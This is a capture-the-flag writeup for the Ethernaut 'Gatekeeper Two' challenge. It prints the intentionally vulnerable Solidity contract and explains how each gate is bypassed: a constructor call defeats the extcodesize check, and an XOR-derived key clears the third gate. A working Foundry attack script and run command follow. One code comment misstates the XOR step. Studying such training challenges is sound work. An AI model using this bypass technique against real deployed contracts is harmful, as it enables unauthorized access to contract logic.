---
title: GateKeeper Two - The Ethernaut
published: 2025-10-11
description: GateKeeper Two challenge writeup
tags: [blockchain, ethernaut]
category: CTF
image: "https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg"
draft: false
---

> Cover image source: [Source](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)

## Challenge Overview

Gatekeeper Two is a three-gate challenge that prevents direct entry by ordinary externally-owned accounts.
The goal is to become the contract's `entrant` by calling `enter(bytes8 _gateKey)` while satisfying three intentional checks (the "gates"):

1. **`gateOne`**: The caller must be a contract — i.e., `msg.sender != tx.origin`.
2. **`gateTwo`**: The contract checks the code size of the caller in assembly (`extcodesize(caller()) == 0`). This means the call must be made while the caller's address has no deployed code (the classic way to satisfy this is to perform the call from inside the *constructor* of the attacking contract).
3. **`gateThree`**: A 64-bit bitwise constraint on the supplied `_gateKey` that depends on `msg.sender` (not `tx.origin`): `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max`.

This writeup explains how to construct the correct `_gateKey`, why each gate exists, and how the constructor-call technique is used to satisfy `gateTwo`.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

---

## Exploit Explanation

To bypass the first gate we simply have to create another contract and call it.

The second gate was harder, and we found this article talking about it: the Medium post explains how `extcodesize` can be bypassed by making the call during the attacking contract’s constructor. {{<externalLinkCard title="Bypass Solidity Contract Size Check — BrianKim (Coinmonks)" link="https://medium.com/coinmonks/bypass-solidity-contract-size-check-c6e93396b722" cover="images/dark-cloud.jpg">}}

Summing up, we have to call everything inside the constructor to bypass it.

Now the third gate was the most challenging. Below is a compact, corrected, and prettier derivation using XOR properties.

### XOR math (prettified)

Start from the relation used in the exploit:

$$
x \oplus \text{key} = \text{max}
$$

XOR both sides with \(x\). Using associativity/commutativity of XOR:

$$
x \oplus (x \oplus \text{key}) = x \oplus \text{max}
$$

The left-hand side simplifies because \(x \oplus x = 0\) and \(0 \oplus \text{key} = \text{key}\). So:

$$
\text{key} = x \oplus \text{max}.
$$

Equivalently (XOR is symmetric):

$$
x \oplus \text{max} = \text{key}.
$$

You can also solve for \(x\) directly by XOR-ing the original equation with `key`:

$$
x = \text{max} \oplus \text{key}.
$$

### Short step-by-step (text)

1. Given: `x ⊕ key = max`.  
2. XOR both sides with `x`: `(x ⊕ key) ⊕ x = max ⊕ x`.  
3. Since `(x ⊕ key) ⊕ x = key` (because `x ⊕ x = 0`), we get `key = max ⊕ x`.  
4. Rearranged: `x ⊕ max = key`.  
5. And solving for `x`: `x = max ⊕ key`.

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GatekeeperTwo.sol";

contract Attack {
    GatekeeperTwo public gatekeeperTwoInstance;

    constructor(GatekeeperTwo _gatekeeperTwoInstance) {
        gatekeeperTwoInstance = _gatekeeperTwoInstance;
        bytes8 x = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 key;
        // x ^ key = max
        
        // Using the property of XOR operation:
        // x ^ x ^ key = max

        // x ^ x ^ key => results in key, x will cancel the other x

        // Since x ^ key = max, we can substitute in the operation above
        // x ^ max = max

        
        key = x ^ bytes8(type(uint64).max);
        
        require(gatekeeperTwoInstance.enter(key) == true, "Failed to complete the challenge!");
    }
}

contract GatekeeperTwoSolution is Script {
    
     GatekeeperTwo public gatekeeperTwoInstance = GatekeeperTwo(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack evil = new Attack(gatekeeperTwoInstance);
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Run with Foundry (example):

```bash
forge script script/GatekeeperTwoSolution.s.sol --rpc-url $SEPOLIA_URL --tc GatekeeperTwoSolution --broadcast
```